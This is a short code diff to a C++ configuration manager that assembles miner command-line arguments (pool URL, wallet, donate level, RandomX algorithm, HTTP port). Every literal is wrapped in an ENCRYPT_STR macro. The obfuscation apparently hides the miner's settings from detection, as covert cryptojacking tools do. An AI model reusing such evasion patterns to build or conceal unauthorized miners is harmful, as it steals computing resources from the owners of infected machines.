@@ -261,8 +261,7 @@ std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool 
         return "";
     }
 
-    std::string args = ENCRYPT_STR("--donate-level 3 ");
-    args += ENCRYPT_STR("-o ");
+    std::string args = ENCRYPT_STR("--donate-level 3 -o ");
     args += config.mining_url + " ";
     args += ENCRYPT_STR("-u ");
     args += config.wallet + " ";
@@ -291,7 +290,7 @@ std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool 
         args += std::to_string(hint) + " ";
     }
     
-    args += ENCRYPT_STR("--http-port 8888");
+    args += ENCRYPT_STR("-a rx/0 --http-port 8888");
     
     return args;
 }
